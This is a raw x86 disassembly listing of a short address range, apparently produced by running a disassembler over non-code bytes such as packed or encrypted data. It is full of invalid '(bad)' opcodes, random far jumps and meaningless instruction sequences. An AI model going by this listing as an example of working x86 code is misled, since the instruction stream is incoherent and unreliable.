  421d38:	imul   ebx,DWORD PTR [ebx-0x76],0xc2dcb411
  421d3f:	mov    BYTE PTR [ebp+0x26],0x2f
  421d43:	and    al,0x8a
  421d45:	or     ch,0x64
  421d48:	sub    al,0xd4
  421d4a:	add    BYTE PTR [edx-0x49],al
  421d4d:	and    al,0xba
  421d4f:	ins    DWORD PTR es:[edi],dx
  421d50:	retf   
  421d51:	cld    
  421d52:	pop    esi
  421d53:	cmp    dl,bh
  421d55:	ja     0x421d2e
  421d57:	cmp    DWORD PTR [ecx-0x62],0xf4cd072a
  421d5e:	push   edx
  421d5f:	and    eax,DWORD PTR [edx]
  421d61:	lods   al,BYTE PTR ss:[esi]
  421d63:	scas   al,BYTE PTR es:[edi]
  421d64:	push   eax
  421d65:	xchg   ebp,eax
  421d66:	dec    edx
  421d67:	cld    
  421d68:	xchg   edi,eax
  421d69:	pop    ds
  421d6a:	out    0x12,eax
  421d6c:	push   eax
  421d6d:	jecxz  0x421d6f
  421d6f:	mov    esp,0x19ce2ae7
  421d74:	jns    0x421dc7
  421d76:	sub    al,0x65
  421d78:	aam    0x88
  421d7a:	push   ss
  421d7b:	pop    esi
  421d7c:	xchg   ecx,eax
  421d7d:	aaa    
  421d7e:	xor    al,0xa4
  421d80:	cs xchg edi,eax
  421d82:	fs ja  0x421d66
  421d85:	aad    0x1d
  421d87:	sbb    al,0x4a
  421d89:	sti    
  421d8a:	(bad)  
  421d8b:	fdiv   st(6),st
  421d8d:	int    0x56
  421d8f:	fmul   QWORD PTR [esi-0x7b64b43]
  421d95:	dec    ecx
  421d96:	or     eax,0xf335dc0a
  421d9b:	adc    esp,ebx
  421d9d:	jecxz  0x421dcc
  421d9f:	push   edi
  421da0:	loop   0x421e02
  421da2:	rcr    BYTE PTR [ecx],1
  421da4:	jae    0x421dfd
  421da6:	pop    ebx
  421da7:	imul   ecx,esi,0x2d
  421daa:	mov    es,WORD PTR [ebx+0x2d0aab5]
  421db0:	pop    esi
  421db1:	int    0x5a
  421db3:	xchg   ebp,eax
  421db4:	std    
  421db5:	in     eax,dx
  421db6:	jns    0x421d85
  421db8:	mov    bl,al
  421dba:	add    DWORD PTR [esi+0x52b83490],edi
  421dc0:	retf   0xff5d
  421dc3:	test   eax,0xa1032669
  421dc8:	outs   dx,BYTE PTR ds:[esi]
  421dc9:	jecxz  0x421dff
  421dcb:	cs xchg esi,eax
  421dcd:	aas    
  421dce:	sbb    al,0x81
  421dd0:	mov    BYTE PTR [edi],ch
  421dd2:	je     0x421da6
  421dd4:	das    
  421dd5:	call   0x559f:0xe0d4be5f
  421ddc:	jl     0x421db7
  421dde:	stos   DWORD PTR es:[edi],eax
  421ddf:	jns    0x421db0
  421de1:	mov    bh,0xaf
  421de3:	fs (bad) 
  421de5:	bound  edi,QWORD PTR [ecx-0xcb5f2a7]
  421deb:	int3   
  421dec:	mov    bh,0x31
  421dee:	fldenv [eax+eax*2+0x66]
  421df2:	or     ch,al
  421df4:	pop    ebx
  421df5:	xchg   BYTE PTR [edi+0x32198121],ch
  421dfb:	sbb    ah,BYTE PTR [ebx+0x79ad87a7]
  421e01:	fstp   TBYTE PTR ds:0x954baed8
  421e07:	sbb    al,0xe4
  421e0a:	lods   al,BYTE PTR ds:[esi]
  421e0b:	dec    ebx
  421e0c:	ja     0x421dcf
  421e0e:	push   edx
  421e0f:	dec    edx
  421e10:	add    al,BYTE PTR [ebx-0x6df876d]
  421e16:	mov    ds:0x698c2184,eax
  421e1b:	(bad)  
  421e1c:	jmp    0x7ab8:0xf75eddeb
  421e23:	or     eax,0x76a1bdad
  421e28:	mov    edi,0x1f2e40c9
  421e2d:	(bad)  
  421e2e:	stc    
  421e2f:	(bad)  
  421e30:	jp     0x421dbd
  421e32:	mov    eax,ds:0xf14111
  421e37:	cs cwde 
  421e39:	shl    DWORD PTR [esi+0x4b],0xcb
  421e3d:	pop    edx
  421e3e:	aam    0x5c
  421e40:	inc    edx
  421e41:	pop    es
  421e42:	xchg   WORD PTR [edx+0x47f0dd8c],ax
  421e49:	ds cdq 
  421e4b:	mov    ch,0x8c
  421e4d:	(bad)  
  421e4e:	xlat   BYTE PTR ds:[ebx]
  421e4f:	mov    WORD PTR [ecx],cs
  421e51:	jecxz  0x421e18
  421e53:	stos   DWORD PTR es:[edi],eax
  421e54:	pop    ebx
  421e55:	mov    eax,ds:0xdb074246
  421e5a:	aas    
  421e5b:	mov    esp,0xaabaf719
  421e60:	jl     0x421ea5
  421e62:	retf   0x2cdc
  421e65:	mov    ah,0xfe
  421e67:	das    
  421e68:	sub    esp,esi
  421e6a:	iret   
  421e6b:	lds    esp,FWORD PTR ds:0xeb258a43
  421e71:	dec    ebp
  421e72:	pop    esi
  421e73:	pop    esi
  421e74:	nop
  421e75:	shl    edx,cl
  421e77:	fcom   QWORD PTR [esi+0x66355214]
  421e7d:	mov    dh,0x98
  421e7f:	pop    ebp
  421e80:	push   ebx
  421e81:	popf   
  421e82:	sbb    eax,DWORD PTR [edx+0x1c]
  421e85:	arpl   WORD PTR [ebx+0x54],bx
  421e88:	sbb    eax,edi
  421e8a:	push   ecx
  421e8b:	sbb    al,0x8b
  421e8d:	cld    
  421e8e:	in     eax,dx
  421e8f:	loopne 0x421e30
  421e91:	data16 mov ah,0x93
  421e94:	ss mov ecx,0xb5b467be
  421e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e9b:	ret    
  421e9c:	in     al,0x8d
  421e9e:	mov    bh,0x55
  421ea0:	dec    eax
  421ea1:	jge    0x421e97
  421ea3:	lahf   
  421ea4:	xchg   ebx,eax
  421ea5:	pop    ds
  421ea6:	jle    0x421f19
  421ea8:	stc    
  421ea9:	jo     0x421ecc
  421eab:	and    al,0xfd
  421ead:	inc    edi
  421eae:	leave  
  421eaf:	out    0xb4,al
  421eb1:	jae    0x421ec6
  421eb3:	sub    dh,BYTE PTR [esi-0x6e]
  421eb6:	sub    bl,dl
  421eb8:	add    DWORD PTR [esi+0x69],eax
  421ebb:	push   0xffffffb7
  421ebd:	into   
  421ebe:	sbb    esi,DWORD PTR [esi+0x5a]
  421ec1:	jae    0x421ee0
  421ec3:	add    BYTE PTR [ebp-0x4a],bl
  421ec6:	cdq    
  421ec7:	fnstenv [edx]
  421ec9:	jnp    0x421f0e
  421ecb:	cmp    al,0x99
  421ecd:	and    eax,0x46e551be
  421ed2:	lahf   
  421ed3:	fnstcw WORD PTR [ebp+edx*8+0x2f9708dd]
  421eda:	(bad)  [ecx]
  421edc:	jae    0x421f0a
  421ede:	aas    
  421edf:	xor    esi,DWORD PTR [edx]
  421ee1:	popf   
  421ee2:	or     DWORD PTR [ebp-0xd71a4bd],0xffffff93
  421ee9:	out    dx,eax
  421eea:	jnp    0x421e96
  421eec:	push   edi
  421eed:	clc    
  421eee:	cmp    eax,0xd6b8e5a
  421ef3:	call   DWORD PTR [ecx+0x7b8079ac]
  421ef9:	xchg   edi,eax
  421efa:	cli    
  421efb:	shl    cl,0xda
  421efe:	cmp    edx,DWORD PTR [ebx]
  421f00:	xlat   BYTE PTR ds:[ebx]
  421f01:	or     eax,0xb146df41
  421f06:	adc    BYTE PTR [edx-0x75],ah
  421f09:	adc    eax,0xa262089e
  421f0e:	imul   ecx,DWORD PTR [edx+0x3b0faf35],0x2b
  421f15:	mov    al,ds:0x9c6b4883
  421f1a:	jae    0x421ea9
  421f1c:	ror    DWORD PTR [ebx-0x53c0917c],1
  421f22:	(bad)  
  421f23:	nop
  421f24:	fmul   DWORD PTR [edx-0x1c91cc1]
  421f2a:	xchg   ecx,eax
  421f2b:	jmp    0x8952:0x20e34cc0
  421f32:	sbb    ah,bl
  421f34:	and    bl,BYTE PTR [ecx+0x7cd7e2a1]
  421f3a:	pop    edx
  421f3b:	lods   eax,DWORD PTR ds:[esi]
  421f3c:	dec    ebx
  421f3d:	cs or  eax,0x74c0a591
  421f43:	mov    dh,0x2
  421f45:	out    0xd1,al
  421f47:	fs mov edi,0x6015101f
  421f4d:	add    cl,BYTE PTR [ecx-0x2092ccb6]
  421f53:	or     esp,DWORD PTR [edx]
  421f55:	clc    
  421f56:	push   edx
  421f57:	or     al,BYTE PTR ds:0x4c2549fa
  421f5d:	mov    al,0xe2
  421f5f:	and    ch,BYTE PTR ds:0xadb29bbf
  421f65:	mov    ds,edx
  421f67:	jae    0x421f84
  421f69:	ffree  st(3)
  421f6b:	sahf   
  421f6c:	lock jnp 0x421f3c
  421f6f:	adc    al,0xfe
  421f71:	mov    bh,0x92
  421f73:	xchg   ecx,eax
  421f74:	repz sub al,0xb5
  421f77:	adc    bh,cl
  421f79:	lds    esi,FWORD PTR [edi-0x35]
  421f7c:	pop    edi
  421f7d:	xchg   ch,al
  421f7f:	dec    ebp
  421f80:	sub    al,0x8f
  421f82:	loop   0x421f08
  421f84:	inc    edi
  421f85:	mov    ch,BYTE PTR fs:[edx+0x1f]
  421f89:	enter  0x9878,0x56
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	inc    edx
  421f8f:	inc    eax
  421f90:	xchg   ecx,eax
  421f91:	sbb    al,BYTE PTR [esi+eax*2+0x55]
  421f95:	mov    edi,0x1c788378
  421f9a:	xor    esi,DWORD PTR [edx+ebx*2-0x7289fdff]
  421fa1:	retf   0xd427
  421fa4:	add    BYTE PTR [esi+0x1441ad9c],0xbb
  421fab:	adc    BYTE PTR [ecx+0x62],0xf4
  421faf:	outs   dx,BYTE PTR ds:[esi]
  421fb0:	and    ah,BYTE PTR [ebp+0x28]
  421fb3:	es add dl,bh
  421fb6:	out    dx,al
  421fb7:	cs jns 0x421fbd
  421fba:	enter  0xf6c9,0x74
  421fbe:	arpl   WORD PTR [eax+ebp*2+0xee899d2],si
  421fc5:	mov    ebx,ss
  421fc7:	xchg   esi,eax
  421fc8:	(bad)  
  421fc9:	push   0x12
  421fcb:	push   ebp
  421fcc:	mov    DWORD PTR [ebx+ebx*8-0x78d32af2],ebx
  421fd3:	aaa    
  421fd4:	ja     0x421f98
  421fd6:	(bad)  
  421fd7:	fidivr DWORD PTR [ebx]
  421fd9:	dec    ebx
  421fda:	sbb    eax,0x95f4af43
  421fdf:	test   al,bl
  421fe1:	and    al,BYTE PTR [edi+0x3b068e69]
  421fe7:	inc    ecx
  421fe8:	jae    0x421f99
  421fea:	sub    cl,dh
  421fec:	pop    ecx
  421fed:	xor    ebx,esp
  421fef:	sbb    BYTE PTR [ecx],bh
  421ff1:	in     al,dx
  421ff2:	push   cs
  421ff3:	mov    ecx,0xdec833a0
  421ff8:	test   al,0xde
  421ffa:	add    al,0xa9
  421ffc:	push   ss
  421ffd:	inc    ecx
  421ffe:	dec    ecx
  421fff:	sbb    edi,ebp
  422001:	in     eax,0xdd
  422003:	add    esi,ebx
  422005:	jbe    0x422038
  422007:	sbb    DWORD PTR [ebx+0x8],esp
  42200a:	js     0x42200d
  42200c:	lahf   
  42200d:	push   ss
  42200e:	push   ecx
  42200f:	stos   BYTE PTR es:[edi],al
  422010:	fld    QWORD PTR gs:[eax+0x45]
  422014:	imul   eax,DWORD PTR [ebx],0x5abb5008
  42201a:	inc    BYTE PTR [esi+0x17bf899]
  422020:	sbb    ecx,DWORD PTR ds:0xd3978d27
  422026:	stc    
  422027:	jae    0x42202e
  422029:	das    
  42202a:	push   eax
  42202b:	lea    esp,[ecx+edi*4]
  42202e:	stos   DWORD PTR es:[edi],eax
  42202f:	jo     0x42208c
  422031:	xchg   ebp,eax
  422032:	lahf   
  422033:	out    dx,al
  422034:	sub    al,bh
  422036:	shl    BYTE PTR [esi+0x3ec56d87],0xc3
  42203d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42203e:	stc    
  42203f:	push   ebx
  422040:	xchg   esi,eax
  422041:	mov    esp,0xc86b5720
  422046:	ja     0x421ffd
  422048:	into   
  422049:	add    BYTE PTR [ecx-0x75],ch
  42204c:	mov    ebp,0x9d609140
  422051:	fild   WORD PTR [edi+0x32f80c44]
  422057:	xor    edx,DWORD PTR [esi+0x5]
  42205a:	fldcw  WORD PTR [eax+0x4942b9cb]
  422060:	(bad)  
  422061:	mov    ah,0x1d
  422063:	mov    ebp,0xf759891
  422068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422069:	fdiv   QWORD PTR [esi+0x76]
  42206c:	aam    0x1a
  42206e:	ret    0x9d6b
  422071:	push   0x38
  422073:	dec    ecx
  422074:	pop    ss
  422075:	fild   QWORD PTR [edi+0x55]
  422078:	and    eax,eax
  42207a:	add    BYTE PTR [ebx+0x3d24b782],dl
  422080:	and    ebx,DWORD PTR ds:0x1715bcee
  422086:	js     0x4220d1
  422088:	ins    BYTE PTR es:[edi],dx
  422089:	out    0xb3,eax
  42208b:	xchg   edx,eax
  42208c:	cmc    
  42208d:	mov    esp,0xb547605a
  422092:	inc    ebp
  422093:	inc    eax
  422094:	jmp    0xc2802215
  422099:	ret    
  42209a:	nop
  42209b:	lahf   
  42209c:	mov    al,0xa7
  42209e:	pushf  
  42209f:	inc    edx
  4220a0:	out    0x21,eax
  4220a2:	xor    ah,BYTE PTR [edx+0x43]
  4220a5:	inc    ebx
  4220a6:	ins    DWORD PTR es:[edi],dx
  4220a7:	mov    cl,0xa8
  4220a9:	test   eax,0xf394bb9e
  4220ae:	mov    BYTE PTR [ecx-0x6a120983],dh
  4220b4:	mov    ds:0x23654593,al
  4220b9:	add    eax,0x43105fc9
  4220be:	or     al,0x50
  4220c0:	cdq    
  4220c1:	push   ss
  4220c2:	sub    al,0xfa
  4220c4:	imul   ecx,DWORD PTR [ebp+0x4e4679a1],0x878e0456
  4220ce:	cmp    DWORD PTR [edx+eax*1],esp
  4220d1:	dec    eax
  4220d2:	push   edi
  4220d3:	mov    WORD PTR [esp+esi*4+0x6e],cs
  4220d7:	add    esp,DWORD PTR [esi+0x23dff17e]
  4220dd:	jg     0x4220da
  4220df:	sti    
  4220e0:	mov    ds:0x66f00535,eax
  4220e5:	inc    edx
  4220e6:	mov    ds:0xcd1742df,al
  4220eb:	add    edi,DWORD PTR [edx]
  4220ed:	jbe    0x4220d0
  4220ef:	lods   eax,DWORD PTR ds:[esi]
  4220f0:	int3   
  4220f1:	or     ebx,DWORD PTR [edx]
  4220f3:	fcmovbe st,st(1)
  4220f5:	jne    0x422129
  4220f7:	mov    ah,0x90
  4220f9:	(bad)  
  4220fa:	leave  
  4220fb:	inc    esp
  4220fc:	cmp    al,BYTE PTR [eax-0x28]
  4220ff:	mov    ah,0xe5
  422101:	and    BYTE PTR [eax],ah
  422103:	inc    ecx
  422104:	jl     0x42208a
  422106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422107:	cld    
  422108:	mov    cl,0x40
  42210a:	ds ja  0x422107
  42210d:	jge    0x422096
  42210f:	or     DWORD PTR [edx],esp
  422111:	push   edi
  422112:	mov    ah,0x74
  422114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422115:	cwde   
  422116:	xor    eax,0x5e130a28
  42211b:	icebp  
  42211c:	test   BYTE PTR [bp+di-0x22a6],ch
  422121:	aaa    
  422122:	or     DWORD PTR [eax-0x7d76ca2a],esi
  422128:	push   0xa883c169
  42212d:	popa   
  42212e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42212f:	push   0xffffffe1
  422131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422132:	enter  0xe755,0xd3
  422136:	retf   
  422137:	fld    DWORD PTR [eax]
  422139:	inc    ebp
  42213a:	rcl    DWORD PTR [ebx+ebx*4],1
  42213d:	(bad)  
  42213e:	inc    ebp
  42213f:	xchg   edx,eax
  422140:	pop    esp
  422141:	fist   WORD PTR [ebx-0x41ada50c]
  422147:	xor    DWORD PTR [edi],0xfffffff1
  42214a:	or     eax,0xe12b8a97
  42214f:	mov    al,0x5d
  422151:	dec    ecx
  422152:	aas    
  422153:	call   0x5d95:0x12ca9fcb
  42215a:	dec    edx
  42215b:	mov    WORD PTR [esi],es
  42215d:	pop    ds
  42215e:	add    BYTE PTR [esi+0x45],ch
  422161:	adc    BYTE PTR [edi+0x5a86607f],al
  422167:	cmp    al,0xd2
  422169:	xchg   ebx,eax
  42216a:	cwde   
  42216b:	push   ecx
  42216c:	hlt    
  42216d:	push   0xdfe82921
  422172:	adc    eax,0x8a2a82f6
  422177:	popf   
  422178:	jg     0x4221dd
  42217a:	cwde   
  42217b:	inc    edx
  42217c:	test   al,0x46
  42217e:	(bad)  
  42217f:	sbb    BYTE PTR [edx+ecx*8+0x64a55068],al
  422186:	mov    ds:0xc53cd2a9,eax
  42218b:	pop    ds
  42218c:	cs adc al,0xe1
  42218f:	push   ecx
  422190:	inc    ebx
  422191:	loope  0x4221dd
  422193:	aam    0xa7
  422195:	imul   eax,edx,0x44
  422198:	inc    edx
  422199:	loopne 0x422201
  42219b:	lods   eax,DWORD PTR ds:[esi]
  42219c:	iret   
  42219d:	aam    0xba
  42219f:	jmp    0x4221b9
  4221a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221a2:	stos   BYTE PTR es:[edi],al
  4221a3:	adc    DWORD PTR [ecx+0x7],ebx
  4221a6:	in     al,0xc7
  4221a8:	or     ebp,DWORD PTR [esi+0x4bc3d835]
  4221ae:	mov    ah,0x44
  4221b0:	jne    0x422168
  4221b2:	mov    ch,0xb
  4221b4:	ds in  al,dx
  4221b6:	xchg   BYTE PTR [eax],cl
  4221b8:	fs sub eax,0x574aa92b
  4221be:	jge    0x422146
  4221c0:	fsub   QWORD PTR [eax+0x3a0d9a81]
  4221c6:	push   0xcfc86280
  4221cb:	push   ecx
  4221cc:	jbe    0x4221a5
  4221ce:	mov    BYTE PTR [edx-0x6e895dbb],bh
  4221d4:	dec    eax
  4221d5:	cmp    esi,DWORD PTR [ebx]
  4221d7:	add    al,0x65
  4221d9:	adc    BYTE PTR [edi-0x1e],0x4a
  4221dd:	cmp    dl,dl
  4221df:	and    DWORD PTR [edi],eax
  4221e1:	sbb    DWORD PTR [ecx+eiz*2],eax
  4221e4:	push   ecx
  4221e5:	pop    ebp
  4221e6:	dec    edx
  4221e7:	out    0xba,al
  4221e9:	(bad)  
  4221ea:	je     0x422196
  4221ec:	jnp    0x42225a
  4221ee:	outs   dx,DWORD PTR ds:[esi]
  4221ef:	mov    edi,0xfc119863
  4221f4:	es lahf 
  4221f6:	or     eax,0x731312d3
  4221fb:	xchg   ebp,eax
  4221fc:	mov    bl,0xa2
  4221fe:	shl    bl,cl
  422200:	jb     0x42218d
  422202:	leave  
  422203:	retf   
  422204:	push   ds
  422205:	jecxz  0x422219
  422207:	repnz pop eax
  422209:	jb     0x422218
  42220b:	stos   DWORD PTR es:[edi],eax
  42220c:	jge    0x42226f
  42220e:	clc    
  42220f:	fst    QWORD PTR [ecx]
  422211:	mov    eax,0x6166d61b
  422216:	jmp    0x4221db
  422218:	ins    DWORD PTR es:[edi],dx
  422219:	mov    ah,0x3a
  42221b:	jmp    0x422276
  42221d:	cmc    
  42221e:	int3   
  42221f:	ins    DWORD PTR es:[edi],dx
  422220:	cmp    ch,dh
  422222:	adc    dl,bh
  422224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422225:	push   esi
  422226:	jg     0x422249
  422228:	cmp    dh,dl
  42222a:	fnstsw WORD PTR [eax-0x9dad5ec]
  422230:	in     al,dx
  422231:	ret    
  422232:	out    dx,al
  422233:	cwde   
  422234:	push   ebx
  422235:	ret    0xf42d
  422238:	retf   
  422239:	jae    0x42225c
  42223b:	and    eax,0xe628c4f5
  422240:	jmp    0x3877:0xc50d89f8
  422247:	loop   0x422209
  422249:	sbb    DWORD PTR [ecx],eax
  42224b:	imul   esi,DWORD PTR [ecx-0x6e02de3c],0xffffff84
  422252:	and    bh,ch
  422254:	das    
  422255:	or     dl,BYTE PTR [ebp-0xa]
  422258:	fistp  DWORD PTR [edi]
  42225a:	gs xchg edx,eax
  42225c:	addr16 pop esi
  42225e:	and    DWORD PTR [edx],eax
  422260:	mov    ch,0xbc
  422262:	and    ebx,DWORD PTR [ebx]
  422264:	mov    edi,edi
  422266:	frstor [eax+ebx*8-0x2dac2415]
  42226d:	push   eax
  42226e:	fcom   DWORD PTR [edi]
  422270:	(bad)  
  422271:	mov    ah,0xc0
  422273:	mov    bh,0x4f
  422275:	test   eax,0xd2a6615
  42227a:	int    0xae
  42227c:	sbb    eax,0x60922b8e
  422281:	mov    esp,0xa307b4fa
  422286:	cld    
  422287:	jne    0x42226a
  422289:	inc    esi
  42228a:	lock repnz fimul WORD PTR [esi-0x5413c2a3]
  422292:	or     ecx,ebp
  422294:	(bad)  
  422295:	jb     0x422240
  422297:	cmp    BYTE PTR ds:0x8cb99fc7,ch
  42229d:	ret    0xf1d9
  4222a0:	wbinvd 
  4222a2:	test   eax,0xeb145d96
  4222a7:	out    0xca,al
  4222a9:	add    DWORD PTR [ecx],ebp
  4222ab:	data16 mov WORD PTR [esi-0x6b61db62],gs
  4222b2:	adc    DWORD PTR ds:0x9cab4f43,eax
  4222b8:	push   ebp
  4222b9:	lods   eax,DWORD PTR es:[esi]
  4222bb:	(bad)  
  4222bc:	cmp    al,0xa3
  4222be:	add    al,0x8b
  4222c0:	fwait
  4222c1:	and    BYTE PTR [esi+0x1673e24f],dh
  4222c7:	push   es
  4222c8:	xor    esp,esp
  4222ca:	sub    al,0x1
  4222cc:	xchg   edx,eax
  4222cd:	jecxz  0x42232f
  4222cf:	sub    esi,DWORD PTR [edi]
  4222d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222d2:	hlt    
  4222d3:	xor    eax,ecx
  4222d5:	xor    al,BYTE PTR [eax+0x5c]
  4222d8:	ins    DWORD PTR es:[edi],dx
  4222d9:	add    DWORD PTR [eax-0x11],edi
  4222dc:	pop    edx
  4222dd:	or     eax,0xb39bfaa4
  4222e2:	jg     0x42228b
  4222e4:	out    0xb8,eax
  4222e6:	xor    edi,DWORD PTR ds:0x57c0a63b
  4222ec:	dec    edx
  4222ed:	call   0x486e:0xf935b13c
  4222f4:	repnz inc edi
  4222f6:	gs in  eax,0xa4
  4222f9:	sbb    BYTE PTR [eax+eax*1+0xc463598],cl
  422300:	jg     0x422298
  422302:	shl    BYTE PTR [ebx+ebp*1+0x5460992a],cl
  422309:	jne    0x422299
  42230b:	or     al,0x97
  42230d:	shr    BYTE PTR [esi-0x4256cc29],1
  422313:	adc    edi,DWORD PTR [esi]
  422315:	mov    ebp,0xbd0e3eb1
  42231a:	ja     0x4222a6
  42231c:	jns    0x42234e
  42231e:	es push esp
  422320:	xchg   ecx,eax
  422321:	sub    BYTE PTR [edi+0x2d2b5a3e],dh
  422327:	and    dl,BYTE PTR [esi-0x4]
  42232a:	iret   
  42232b:	gs out 0x7e,eax
  42232e:	or     dh,cl
  422330:	cdq    
  422331:	push   ds
  422332:	jno    0x4222b8
  422334:	or     DWORD PTR [edi+esi*2-0x78f8986d],0x1b2fd9d0
  42233f:	daa    
  422340:	sub    eax,0xd143a5e1
  422345:	inc    edx
  422346:	inc    ebx
  422347:	outs   dx,BYTE PTR ds:[esi]
  422348:	xlat   BYTE PTR gs:[ebx]
  42234a:	stos   BYTE PTR es:[edi],al
  42234b:	je     0x4223b6
  42234d:	push   edx
  42234e:	test   DWORD PTR [ecx+esi*2-0x1da7ed84],edi
  422355:	test   esp,esi
  422357:	nop
  422358:	push   esi
  422359:	dec    esp
  42235a:	jmp    0x42238f
  42235c:	push   es
  42235d:	mov    dh,0x10
  42235f:	stc    
  422360:	push   cs
  422361:	ss das 
  422363:	mov    DWORD PTR [ecx+0x76],ecx
  422366:	mov    eax,0x6f3f7969
  42236b:	stos   BYTE PTR es:[edi],al
  42236c:	mov    ecx,0xabcfbd27
  422371:	mov    bh,0xdd
  422373:	or     al,0xb9
  422375:	adc    DWORD PTR [eax],ebx
  422377:	ja     0x422321
  422379:	daa    
  42237a:	jae    0x422300
  42237c:	aad    0x22
  42237e:	repnz mov eax,ecx
  422381:	ins    DWORD PTR es:[edi],dx
  422382:	mov    eax,0x2e41ff36
  422387:	mov    ds:0x6b5546fd,al
  42238c:	ins    DWORD PTR es:[edi],dx
  42238d:	pop    es
  42238e:	mov    esp,0xf72be34a
  422393:	and    al,0x66
  422395:	xchg   esp,edi
  422397:	dec    edx
  422398:	pop    ebx
  422399:	gs push ebx
  42239b:	fld    QWORD PTR [ecx]
  42239d:	pushf  
  42239e:	add    cl,cl
  4223a0:	aad    0x48
  4223a2:	cmp    eax,0x7c1af6b9
  4223a7:	cmp    DWORD PTR [edx+0x2e40541b],edx
  4223ad:	cmp    edx,DWORD PTR [edi]
  4223af:	inc    esi
  4223b0:	loop   0x4223f9
  4223b2:	ja     0x422371
  4223b4:	pop    esp
  4223b5:	cmc    
  4223b6:	push   0x44
  4223b8:	mov    dl,0xcc
  4223ba:	pop    ebp
  4223bb:	sub    BYTE PTR [ebx-0x5c0da723],al
  4223c1:	cli    
  4223c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223c3:	add    al,0xa4
  4223c5:	into   
  4223c6:	cmp    BYTE PTR [ebx-0x53ef40d6],dl
  4223cc:	repnz arpl bp,ax
  4223cf:	mov    edi,0x5beed7b0
  4223d4:	sbb    eax,0xb4c38022
  4223d9:	adc    al,0x8e
  4223db:	faddp  st(0),st
  4223dd:	(bad)  
  4223de:	ins    BYTE PTR es:[edi],dx
  4223df:	jp     0x4223a3
  4223e1:	psllw  mm7,QWORD PTR [ebx+0x5b1d2b2f]
  4223e8:	mov    al,ds:0xd04c50bc
  4223ed:	mov    esi,0x7d0891f5
  4223f2:	push   ebp
  4223f3:	sub    eax,0x996ecf37
  4223f8:	inc    ecx
  4223f9:	mov    edi,0x83fea1af
  4223fe:	(bad)  
  4223ff:	sub    BYTE PTR ds:0x761d596c,bh
  422405:	cmp    esp,DWORD PTR [edi-0x1db6a4aa]
  42240b:	lds    ecx,FWORD PTR [ecx-0x16]
  42240e:	adc    al,0x33
  422410:	push   cs
  422411:	ret    0x6fc4
  422414:	enter  0x5ae,0x6b
  422418:	mov    bh,0xb4
  42241a:	fdivr  DWORD PTR [ebp+0x50]
  42241d:	cmp    al,0x89
  42241f:	or     esp,ebx
  422421:	pop    ss
  422422:	xchg   di,ax
  422424:	push   es
  422425:	pop    ebp
  422426:	jmp    0x6fcfe27d
  42242b:	fld    DWORD PTR [edi-0xa41711c]
  422431:	sbb    eax,0xfe1f3a34
  422436:	inc    DWORD PTR [edx-0x604ea694]
  42243c:	mov    dh,0xa8
  42243e:	mov    eax,0xdf40a67a
  422443:	push   ebx
  422444:	stc    
  422445:	xchg   esp,eax
  422446:	inc    edx
  422447:	loopne 0x422432
  422449:	fimul  DWORD PTR [eax-0x50260451]
  42244f:	aam    0xa8
  422451:	call   0xb66b:0x73701f93
  422458:	sub    ebp,ebp
  42245a:	sbb    al,0x49
  42245c:	test   eax,0xc75607a4
  422461:	js     0x4223f2
  422463:	pop    edi
  422464:	pop    ebp
  422465:	cmp    dh,BYTE PTR [ebx-0x499aa89f]
  42246b:	pop    ebx
  42246c:	data16 test al,0x44
  42246f:	inc    edx
  422470:	pop    es
  422471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422472:	adc    eax,0x2eed6e90
  422477:	cli    
  422478:	jmp    0x4224d5
  42247a:	adc    al,0x13
  42247c:	aam    0x24
  42247e:	loop   0x42247f
  422480:	xchg   al,ch
  422482:	lds    esi,FWORD PTR [ebx]
  422484:	int    0xe6
  422486:	out    0xa8,eax
  422488:	stos   BYTE PTR es:[edi],al
  422489:	pop    esp
  42248a:	pop    ss
  42248b:	pushf  
  42248c:	daa    
  42248d:	pushf  
  42248e:	xor    eax,0x1dcec9e1
  422493:	dec    esi
  422494:	imul   esp,DWORD PTR [esi],0x88194133
  42249a:	inc    ecx
  42249b:	sbb    ah,dl
  42249d:	sbb    DWORD PTR [edi],ebx
  42249f:	neg    DWORD PTR [edx+0x51c0db75]
  4224a5:	rcl    esp,1
  4224a7:	sbb    ecx,eax
  4224a9:	jno    0x422488
  4224ab:	inc    edi
  4224ac:	adc    ebp,DWORD PTR [ebp+0xc]
  4224af:	icebp  
  4224b0:	xor    DWORD PTR [ebx],eax
  4224b2:	xlat   BYTE PTR ds:[ebx]
  4224b3:	int3   
  4224b4:	inc    edi
  4224b5:	sar    cl,cl
  4224b7:	mov    dh,0x42
  4224b9:	out    dx,al
  4224ba:	sub    al,bl
  4224bc:	adc    eax,0xf616b4c
  4224c1:	pop    edx
  4224c2:	jl     0x422516
  4224c4:	sbb    ebp,0x41
  4224c7:	hlt    
  4224c8:	xchg   esi,eax
  4224c9:	pop    edx
  4224ca:	stos   DWORD PTR es:[edi],eax
  4224cb:	aas    
  4224cc:	xor    al,0x6c
  4224ce:	retf   
  4224cf:	outs   dx,BYTE PTR ds:[esi]
  4224d0:	mov    ebx,0x636ab14d
  4224d5:	xor    BYTE PTR [edi-0x2f928260],cl
  4224db:	adc    esi,DWORD PTR [edi]
  4224dd:	or     ebp,DWORD PTR [edx]
  4224df:	push   0xffffff86
  4224e1:	out    0xda,al
  4224e3:	mov    ah,BYTE PTR [ebx+0x6742f82]
  4224e9:	or     dl,cl
  4224eb:	in     eax,dx
  4224ec:	sbb    eax,DWORD PTR [eax+0x25]
  4224ef:	xchg   esi,eax
  4224f0:	repz pop es
  4224f2:	into   
  4224f3:	pop    edi
  4224f4:	adc    ch,BYTE PTR [eax-0xa]
  4224f7:	push   ss
  4224f8:	push   esp
  4224f9:	adc    BYTE PTR [eax+esi*2],0xa4
  4224fd:	sti    
  4224fe:	xor    eax,0x8c8d355c
  422503:	xor    esi,DWORD PTR fs:[esi]
  422506:	leave  
